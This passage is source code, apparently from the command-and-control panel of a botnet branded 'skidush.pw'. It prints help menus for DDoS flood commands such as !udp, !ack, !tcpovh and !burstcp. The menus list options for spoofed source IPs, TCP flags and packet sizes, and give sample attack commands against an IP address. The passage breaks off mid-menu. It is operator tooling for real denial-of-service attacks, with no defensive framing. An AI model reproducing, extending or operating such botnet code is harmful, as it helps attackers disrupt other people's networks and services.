          send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
            send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);

            continue;
        }

            if(data == "!udp help")
            {
               send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mUDP\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mUDP\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!udp 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n", strlen("\e[37m!udp 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!voltudp help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mvoltudp\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mvoltudp\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!voltudp 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n", strlen("\e[37m!voltudp 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!udpbypass help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mudpbypass\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mudpbypass\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!udpbypass 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n", strlen("\e[37m!udpbypass 77.77.77.78 \e[95mport\e[37m=80 \e[95msize\e[37m=1440\r\n"), MSG_NOSIGNAL);
                continue;
            }

            if(data == "!ack help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mack\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mack\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!ack 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!ack 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }
            
            if(data == "!tcpovh help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mtcpovh\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mtcpovh\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95mack: \e[37mACK flag set in TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mfin: \e[37mFIN flag set in TCP header.\r\n", strlen("\e[95mfin: \e[37mFIN flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95murg: \e[37mURG flag set in TCP header.\r\n", strlen("\e[95murg: \e[37mURG flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n", strlen("\e[95mpsh: \e[37mPSH flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mrst: \e[37mRST flag set in TCP header.\r\n", strlen("\e[95mrst: \e[37mRST flag set in TCP header.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n", strlen("\e[95msyn: \e[37mSYN flag set in the TCP header (default 1 depending on the flood type).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msequence: \e[37mTCP header sequence (default random).\r\n", strlen("\e[95msequence: \e[37mTCP header sequence (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n", strlen("\e[95mack_sequence: \e[37mTCP header ACK sequence.\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!tcpovh 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!tcpovh 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(data == "!protocol help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mprotocol\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mprotocol\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!protocol 77.77.77.78 \e[95mport\e[37m=80\r\n", strlen("\e[37m!protocol 77.77.77.78 \e[95mport\e[37m=80\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(data == "!ethernet help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95methernet\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95methernet\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mtos: \e[37mIP header TOS.\r\n", strlen("\e[95mtos: \e[37mIP header TOS.\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mid: \e[37mIP header ID (default random).\r\n", strlen("\e[95mid: \e[37mIP header ID (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n", strlen("\e[95msource_ip: \e[37mIP header source IP (255.255.255.255 for random).\r\n\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[32mSample of attack:\r\n", strlen("\e[32mSample of attack:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[37m!ethernet 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n", strlen("\e[37m!ethernet 77.77.77.78 \e[95mport\e[37m=80 \e[95msource_ip\e[37m=198.27.92.1\r\n"), MSG_NOSIGNAL);
                continue;
            }
            if(data == "!burstcp help")
            {
              send(fd, "\e[2J\e[H", 9, MSG_NOSIGNAL);
            sprintf(banner1,  "\e[95m███\e[37m╗   \e[95m███\e[37m╗\e[95m██████\e[37m╗  \e[95m██████\e[37m╗ \e[95m████████\e[37m╗\r\n");
            sprintf(banner2,  "\e[95m████\e[37m╗ \e[95m████\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m╔═══\e[95m██\e[37m╗╚══\e[95m██\e[37m╔══╝\r\n");
            sprintf(banner3,  "\e[95m██\e[37m╔\e[95m████\e[37m╔\e[95m██\e[37m║\e[95m██████\e[37m╔╝\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║   \r\n");
            sprintf(banner4,  "\e[95m██\e[37m║╚\e[95m██\e[37m╔╝\e[95m██\e[37m║\e[95m██\e[37m╔══\e[95m██\e[37m╗\e[95m██\e[37m║   \e[95m██\e[37m║   \e[95m██\e[37m║  \r\n");
            sprintf(banner5,  "\e[95m██\e[37m║ ╚═╝ \e[95m██\e[37m║\e[95m██████\e[37m╔╝╚\e[95m██████\e[37m╔╝   \e[95m██\e[37m║   \r\n");
            sprintf(banner6,  "\e[37m╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n");
            sprintf(banner7,  "\t     \e[95mskidush\e[37m.\e[95mpw\r\n\r\n");

                send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
                send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
                send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
                send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
                send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
                send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
                send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
                send(fd, "\e[37mAvailable options for \e[95mburstcp\e[37m:\r\n", strlen("\e[37mAvailable options for \e[95mburstcp\e[37m:\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n", strlen("\e[95mport: \e[37mPort given to specify the destination port of the flood (default random).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n", strlen("\e[95msize: \e[37mSize of each request sent by the flood (default 900).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95mttl: \e[37mIP header TTL (default 255).\r\n", strlen("\e[95mttl: \e[37mIP header TTL (default 255).\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[95msport: \e[37mTCP header source port (default random).\r\n", strlen("\e[95msport: \e[37mTCP header source port (default random).\r\n"), MSG_NOSIGNAL);
